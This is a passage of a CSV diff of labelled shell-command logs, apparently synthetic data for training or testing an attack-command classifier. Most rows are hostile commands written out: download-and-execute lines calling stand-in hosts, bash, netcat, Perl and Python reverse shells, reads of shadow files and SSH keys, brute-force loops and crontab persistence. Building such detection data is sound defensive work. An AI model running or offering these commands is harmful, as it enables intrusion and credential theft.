+log-429,2025-01-10T15:15:42.542751Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-430,2025-04-02T11:58:41.542760Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-431,2025-02-03T07:43:03.542769Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-432,2025-09-04T03:13:32.542778Z,curl -fsSL http://payloads.net/install1.php -o /tmp/install1.php; php /tmp/install1.php,malware_download
+log-433,2025-02-27T22:17:43.542787Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-434,2025-10-01T21:24:11.542796Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-435,2025-03-31T08:45:45.542804Z,find / -name '*.conf' -type f,enumeration
+log-436,2025-04-11T04:38:41.542813Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-437,2025-08-18T08:59:36.542823Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme10.py"",""wb"").write(u.urlopen(""http://badhost.local/runme10.py"").read())'; python3 /tmp/runme10.py",malware_download
+log-438,2025-02-24T12:47:26.542832Z,curl -fsSL http://malware.srv/payload81.php -o /tmp/payload81.php; php /tmp/payload81.php,malware_download
+log-439,2025-05-15T09:31:54.542841Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-440,2025-01-16T12:13:47.542850Z,bash -i >& /dev/tcp/203.0.113.7/2222 0>&1,reverse_shell
+log-441,2025-04-19T11:36:51.542859Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-442,2025-08-19T16:26:30.542868Z,mkdir /tmp/xdata29; chmod 777 /tmp/xdata29,persistence_or_filesystem
+log-443,2025-06-02T06:42:41.542878Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-444,2025-09-09T10:07:46.542888Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-445,2025-11-08T15:43:56.542897Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-446,2025-07-03T08:48:54.542907Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-447,2025-02-05T06:57:46.542917Z,curl -fsSL http://badhost.local/p87.php -o /tmp/p87.php; php /tmp/p87.php,malware_download
+log-448,2025-02-18T02:06:42.542926Z,sshpass -p 'password' ssh ec2-user@10.0.0.5,brute_force
+log-449,2025-05-18T04:09:34.542935Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-450,2024-12-21T06:56:06.542944Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-451,2025-07-03T21:44:41.542954Z,"python3 -c 'import urllib.request as u;open(""/tmp/update77.py"",""wb"").write(u.urlopen(""http://payloads.net/update77.py"").read())'; python3 /tmp/update77.py",malware_download
+log-452,2025-10-24T23:48:57.542962Z,some-weird-tool --foo bar,unknown
+log-453,2025-04-20T10:45:06.542971Z,cat /etc/passwd,credential_harvest
+log-454,2024-12-15T03:14:15.542980Z,curl -fsSL http://malware.srv/payload94.php -o /tmp/payload94.php; php /tmp/payload94.php,malware_download
+log-455,2025-04-12T04:04:05.542990Z,nc -e /bin/sh 45.23.11.9 4444,reverse_shell
+log-456,2025-05-26T09:23:30.542999Z,mkdir /tmp/backdoor30; chmod 777 /tmp/backdoor30,persistence_or_filesystem
+log-457,2024-12-08T03:07:29.543008Z,echo 'hello world',unknown
+log-458,2025-08-08T09:39:25.543018Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-459,2025-01-04T22:54:34.543028Z,nc -e /bin/sh 192.0.2.12 443,reverse_shell
+log-460,2025-06-30T05:51:59.543038Z,"python3 -c 'import urllib.request as u;open(""/tmp/x74.py"",""wb"").write(u.urlopen(""http://malware.srv/x74.py"").read())'; python3 /tmp/x74.py",malware_download
+log-461,2025-09-23T04:00:52.543047Z,bash -i >& /dev/tcp/172.16.0.9/8080 0>&1,reverse_shell
+log-462,2025-06-26T12:49:56.543057Z,mkdir /tmp/tmpdir98; chmod 777 /tmp/tmpdir98,persistence_or_filesystem
+log-463,2025-11-23T05:37:32.543066Z,echo '@reboot root /tmp/x14.sh' >> /etc/crontab,persistence_or_filesystem
+log-464,2024-12-19T10:33:16.543075Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-465,2025-08-14T02:44:01.543085Z,"python3 -c 'import urllib.request as u;open(""/tmp/install18.py"",""wb"").write(u.urlopen(""http://badhost.local/install18.py"").read())'; python3 /tmp/install18.py",malware_download
+log-466,2025-03-31T16:04:41.543094Z,sshpass -p 'password' ssh admin@192.0.2.12,brute_force
+log-467,2025-02-17T06:17:14.543103Z,find / -name '*.conf' -type f,enumeration
+log-468,2025-11-16T07:36:07.543113Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-469,2025-07-09T05:35:01.543122Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
+log-470,2025-02-10T08:00:47.543130Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-471,2025-10-21T18:48:07.543140Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload92.py"",""wb"").write(u.urlopen(""http://badhost.local/payload92.py"").read())'; python3 /tmp/payload92.py",malware_download
+log-472,2025-03-20T05:37:20.543150Z,bash -i >& /dev/tcp/1.2.3.4/4444 0>&1,reverse_shell
+log-473,2025-09-23T21:23:41.543159Z,echo '@reboot root /tmp/payload85.sh' >> /etc/crontab,persistence_or_filesystem
+log-474,2025-08-26T03:46:42.543169Z,cat /etc/passwd,credential_harvest
+log-475,2025-02-08T10:35:13.543178Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-476,2025-09-03T22:30:33.543187Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-477,2025-09-06T22:01:59.543197Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-478,2025-10-20T17:00:36.543206Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-479,2025-07-19T15:55:15.543215Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-480,2024-12-19T05:53:16.543224Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-481,2025-01-26T07:25:20.543233Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-482,2025-10-08T03:02:02.543242Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-483,2025-01-13T20:34:55.543252Z,sshpass -p 'toor' ssh ec2-user@203.0.113.7,brute_force
+log-484,2025-05-18T07:11:36.543261Z,cat /etc/shadow,credential_harvest
+log-485,2025-09-18T05:04:17.543269Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-486,2025-03-08T03:13:32.543278Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-487,2025-09-02T06:14:13.543288Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-488,2025-07-05T20:02:16.543297Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-489,2025-03-25T22:17:50.543306Z,sshpass -p 'password' ssh root@10.0.0.5,brute_force
+log-490,2025-11-18T11:10:55.543316Z,"python3 -c 'import urllib.request as u;open(""/tmp/p67.py"",""wb"").write(u.urlopen(""http://malware.srv/p67.py"").read())'; python3 /tmp/p67.py",malware_download
+log-491,2025-01-03T16:31:48.543325Z,nc -e /bin/sh 10.0.0.5 4444,reverse_shell
+log-492,2025-10-07T17:58:48.543334Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-493,2024-12-11T17:35:37.543343Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-494,2024-12-27T02:04:12.543352Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-495,2024-12-06T08:29:01.543362Z,wget http://evil.example/payload46.sh && chmod +x payload46.sh && ./ payload46.sh,malware_download
+log-496,2025-08-10T19:45:32.543372Z,"python3 -c 'import urllib.request as u;open(""/tmp/install40.py"",""wb"").write(u.urlopen(""http://malware.srv/install40.py"").read())'; python3 /tmp/install40.py",malware_download
+log-497,2025-06-10T10:28:48.543381Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-498,2025-02-25T04:15:41.543390Z,sshpass -p 'toor' ssh admin@10.0.0.5,brute_force
+log-499,2025-06-15T20:19:31.543399Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-500,2024-12-07T07:00:05.543408Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-501,2025-11-01T06:07:30.543416Z,find / -name '*.conf' -type f,enumeration
+log-502,2025-09-22T22:28:27.543426Z,"python3 -c 'import urllib.request as u;open(""/tmp/x18.py"",""wb"").write(u.urlopen(""http://badhost.local/x18.py"").read())'; python3 /tmp/x18.py",malware_download
+log-503,2025-02-18T16:49:08.543435Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-504,2025-03-01T01:58:22.543445Z,echo '@reboot root /tmp/x38.sh' >> /etc/crontab,persistence_or_filesystem
+log-505,2025-05-25T13:07:26.543455Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-506,2024-12-28T23:20:10.543464Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
+log-507,2025-04-17T05:54:02.543474Z,wget http://evil.example/x11.sh && chmod +x x11.sh && ./ x11.sh,malware_download
+log-508,2025-05-03T05:53:43.543483Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-509,2025-11-17T07:13:17.543492Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload74.py"",""wb"").write(u.urlopen(""http://malicious.test/payload74.py"").read())'; python3 /tmp/payload74.py",malware_download
+log-510,2025-03-18T01:03:31.543502Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-511,2025-12-01T10:50:10.543512Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-512,2024-12-16T06:08:52.543521Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-513,2025-01-22T02:54:47.543530Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-514,2025-07-29T03:23:24.543539Z,nc -e /bin/sh 203.0.113.7 4444,reverse_shell
+log-515,2025-08-08T10:15:06.543548Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-516,2025-01-14T21:48:59.543558Z,wget http://badhost.local/install99.sh && chmod +x install99.sh && ./ install99.sh,malware_download
+log-517,2025-03-09T19:23:59.543567Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-518,2025-06-28T08:36:04.543577Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-519,2025-07-21T18:10:58.543586Z,cat /etc/passwd,credential_harvest
+log-520,2025-03-02T03:31:19.543595Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-521,2025-08-31T02:40:04.543604Z,cat /etc/passwd,credential_harvest
+log-522,2025-01-04T04:19:03.543614Z,wget http://evil.example/runme16.sh ; chmod +x runme16.sh ; ./ runme16.sh,malware_download
+log-523,2025-04-18T17:50:39.543623Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-524,2025-11-06T18:30:18.543632Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-525,2025-03-30T23:57:33.543641Z,echo '@reboot root /tmp/payload51.sh' >> /etc/crontab,persistence_or_filesystem
+log-526,2025-10-31T01:20:36.543651Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme34.py"",""wb"").write(u.urlopen(""http://malicious.test/runme34.py"").read())'; python3 /tmp/runme34.py",malware_download
+log-527,2025-09-20T15:53:54.543660Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-528,2025-08-14T03:47:12.543669Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-529,2025-01-17T04:20:52.543678Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-530,2025-07-06T13:42:14.543688Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-531,2025-02-06T19:13:27.543696Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-532,2025-06-18T02:20:54.543706Z,sshpass -p '123456' ssh ec2-user@172.16.0.9,brute_force
+log-533,2025-01-07T03:12:47.543716Z,sshpass -p 'password' ssh admin@192.0.2.12,brute_force
+log-534,2025-10-18T11:17:52.543724Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
+log-535,2024-12-24T13:16:13.543733Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-536,2025-09-25T12:47:30.543743Z,bash -i >& /dev/tcp/45.23.11.9/443 0>&1,reverse_shell
+log-537,2025-04-02T00:58:05.543753Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-538,2025-10-03T20:24:04.543762Z,curl -fsSL http://evil.example/runme99.php -o /tmp/runme99.php; php /tmp/runme99.php,malware_download
+log-539,2025-03-26T05:37:23.543772Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-540,2025-06-04T08:15:23.543781Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-541,2025-09-07T22:05:25.543790Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-542,2025-04-19T02:19:48.543798Z,cat /etc/passwd,credential_harvest
+log-543,2025-02-06T06:47:55.543808Z,wget http://malware.srv/payload15.sh && chmod +x payload15.sh && ./ payload15.sh,malware_download
+log-544,2025-05-09T20:37:37.543817Z,bash -i >& /dev/tcp/45.23.11.9/443 0>&1,reverse_shell
+log-545,2025-04-18T21:25:27.543826Z,bash -i >& /dev/tcp/192.0.2.12/6666 0>&1,reverse_shell
+log-546,2024-12-17T07:12:09.543835Z,bash -i >& /dev/tcp/172.16.0.9/8080 0>&1,reverse_shell
+log-547,2025-09-17T04:40:42.543844Z,curl -fsSL http://evil.example/update29.php -o /tmp/update29.php; php /tmp/update29.php,malware_download
+log-548,2025-02-07T10:40:04.543853Z,mkdir /tmp/backdoor28; chmod 777 /tmp/backdoor28,persistence_or_filesystem
+log-549,2025-09-21T07:01:09.543862Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-550,2025-10-17T11:26:03.543871Z,echo '@reboot root /tmp/payload51.sh' >> /etc/crontab,persistence_or_filesystem
+log-551,2025-01-10T00:36:13.543880Z,sshpass -p 'password' ssh ec2-user@1.2.3.4,brute_force
+log-552,2025-05-31T05:05:08.543889Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-553,2025-07-21T05:36:24.543899Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-554,2025-04-12T05:21:54.543909Z,sshpass -p 'admin123' ssh root@203.0.113.7,brute_force
+log-555,2025-04-06T06:47:08.543918Z,curl http://malicious.test/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-556,2025-11-10T01:36:00.543927Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-557,2025-01-23T14:30:12.543937Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-558,2025-10-12T21:54:29.543946Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-559,2025-06-12T12:36:38.543955Z,bash -i >& /dev/tcp/45.23.11.9/443 0>&1,reverse_shell
+log-560,2025-02-13T15:25:35.543964Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-561,2025-09-10T18:26:26.543973Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-562,2025-03-07T17:31:18.543982Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-563,2025-07-26T14:26:52.543992Z,curl -fsSL http://malicious.test/update74.php -o /tmp/update74.php; php /tmp/update74.php,malware_download
+log-564,2025-05-13T09:43:26.544002Z,wget http://badhost.local/payload21.sh && chmod +x payload21.sh && ./ payload21.sh,malware_download
+log-565,2025-04-24T15:34:33.544011Z,cat /etc/shadow,credential_harvest
+log-566,2025-06-08T00:32:24.544020Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-567,2024-12-29T00:43:33.544029Z,bash -i >& /dev/tcp/203.0.113.7/8080 0>&1,reverse_shell
+log-568,2025-05-23T14:19:58.544038Z,date; whoami,unknown
+log-569,2025-05-03T12:49:36.544048Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-570,2025-01-13T17:57:20.544059Z,wget http://malicious.test/p76.sh ; chmod +x p76.sh ; ./ p76.sh,malware_download
+log-571,2025-03-31T02:22:10.544068Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-572,2025-07-06T04:35:07.544076Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-573,2025-10-06T17:48:50.544085Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-574,2025-10-06T14:19:09.544094Z,sshpass -p '123456' ssh ec2-user@172.16.0.9,brute_force
+log-575,2025-09-15T01:58:53.544104Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-576,2025-10-19T06:06:25.544113Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-577,2025-03-08T06:47:18.544122Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-578,2025-10-15T19:58:28.544131Z,bash -i >& /dev/tcp/45.23.11.9/6666 0>&1,reverse_shell
+log-579,2025-11-28T10:26:54.544141Z,curl -fsSL http://malicious.test/install10.php -o /tmp/install10.php; php /tmp/install10.php,malware_download
+log-580,2025-10-07T19:48:41.544150Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-581,2025-11-27T10:16:33.544160Z,curl -fsSL http://malicious.test/p55.php -o /tmp/p55.php; php /tmp/p55.php,malware_download
+log-582,2025-07-06T03:31:59.544172Z,cat /etc/passwd,credential_harvest
+log-583,2025-09-23T17:48:29.544183Z,cat /etc/passwd,credential_harvest
+log-584,2025-08-17T20:55:59.544192Z,echo '@reboot root /tmp/p75.sh' >> /etc/crontab,persistence_or_filesystem
+log-585,2024-12-14T06:26:54.544201Z,mkdir /tmp/backdoor47; chmod 777 /tmp/backdoor47,persistence_or_filesystem
+log-586,2025-06-29T23:24:23.544211Z,wget http://malicious.test/payload30.sh && chmod +x payload30.sh && ./ payload30.sh,malware_download
+log-587,2025-06-22T09:55:54.544220Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-588,2025-05-01T21:02:01.544229Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-589,2025-09-24T13:31:57.544238Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-590,2025-05-14T23:26:15.544247Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-591,2025-03-20T17:45:11.544261Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-592,2025-10-18T01:58:58.544271Z,"python3 -c 'import urllib.request as u;open(""/tmp/x81.py"",""wb"").write(u.urlopen(""http://evil.example/x81.py"").read())'; python3 /tmp/x81.py",malware_download
+log-593,2025-10-28T08:58:35.544280Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-594,2025-03-03T03:15:49.544290Z,cat /etc/shadow,credential_harvest
+log-595,2025-11-20T21:28:03.544300Z,mkdir /tmp/backdoor5; chmod 777 /tmp/backdoor5,persistence_or_filesystem
+log-596,2025-10-11T07:11:45.544308Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-597,2025-07-25T09:53:45.544317Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-598,2025-06-02T15:12:18.544326Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-599,2025-06-11T01:51:07.544335Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-600,2025-11-26T08:18:14.544344Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-601,2025-11-25T16:22:59.544353Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-602,2025-03-27T09:36:07.544363Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-603,2025-10-29T08:23:53.544372Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-604,2025-10-19T06:21:29.544381Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-605,2025-07-06T12:08:43.544390Z,nc -e /bin/sh 203.0.113.7 2222,reverse_shell
+log-606,2025-01-19T09:06:43.544398Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-607,2025-01-21T01:43:37.544407Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-608,2025-01-16T20:29:45.544417Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-609,2025-08-31T02:53:54.544425Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-610,2025-07-20T22:56:23.544434Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-611,2025-11-04T13:05:18.544444Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-612,2024-12-31T06:46:29.544453Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-613,2025-08-08T12:30:39.544462Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-614,2024-12-13T23:47:39.544471Z,wget http://malicious.test/update76.sh && chmod +x update76.sh && ./ update76.sh,malware_download
+log-615,2025-11-26T04:24:32.544481Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-616,2025-01-13T14:41:45.544490Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-617,2025-07-06T00:37:16.544499Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-618,2025-07-20T00:59:27.544508Z,mkdir /tmp/backdoor5; chmod 777 /tmp/backdoor5,persistence_or_filesystem
+log-619,2025-11-03T15:05:47.544517Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-620,2025-04-23T04:33:55.544526Z,hydra -l root -P /tmp/wordlist.txt ssh://172.16.0.9,brute_force
+log-621,2024-12-06T04:16:16.544535Z,"python3 -c 'import urllib.request as u;open(""/tmp/p21.py"",""wb"").write(u.urlopen(""http://malicious.test/p21.py"").read())'; python3 /tmp/p21.py",malware_download
+log-622,2025-08-28T00:50:03.544545Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-623,2025-04-14T20:41:18.544554Z,sshpass -p 'toor' ssh admin@192.0.2.12,brute_force
+log-624,2025-02-19T23:38:04.544563Z,bash -i >& /dev/tcp/192.0.2.12/6666 0>&1,reverse_shell
+log-625,2025-07-12T09:54:54.544573Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme27.py"",""wb"").write(u.urlopen(""http://payloads.net/runme27.py"").read())'; python3 /tmp/runme27.py",malware_download
+log-626,2025-11-22T17:20:29.544583Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-627,2025-06-24T13:25:57.544591Z,echo 'hello world',unknown
+log-628,2025-06-19T19:21:24.544600Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-629,2025-05-18T14:24:11.544609Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-630,2025-03-10T12:08:41.544619Z,wget http://malware.srv/update60.sh && chmod +x update60.sh && ./ update60.sh,malware_download
+log-631,2025-07-25T05:35:27.544630Z,wget http://badhost.local/runme47.sh && chmod +x runme47.sh && ./ runme47.sh,malware_download
+log-632,2025-01-04T04:43:38.544638Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-633,2024-12-10T10:53:57.544647Z,find / -name '*.conf' -type f,enumeration
+log-634,2025-06-12T00:30:00.544656Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-635,2025-08-02T09:46:17.544665Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-636,2025-09-20T02:51:21.544674Z,cat /etc/shadow,credential_harvest
+log-637,2025-02-18T23:11:55.544684Z,"python3 -c 'import urllib.request as u;open(""/tmp/p84.py"",""wb"").write(u.urlopen(""http://payloads.net/p84.py"").read())'; python3 /tmp/p84.py",malware_download
+log-638,2025-09-06T19:09:58.544693Z,wget http://badhost.local/payload78.sh && chmod +x payload78.sh && ./ payload78.sh,malware_download
+log-639,2025-01-06T22:17:43.544702Z,echo '@reboot root /tmp/install52.sh' >> /etc/crontab,persistence_or_filesystem
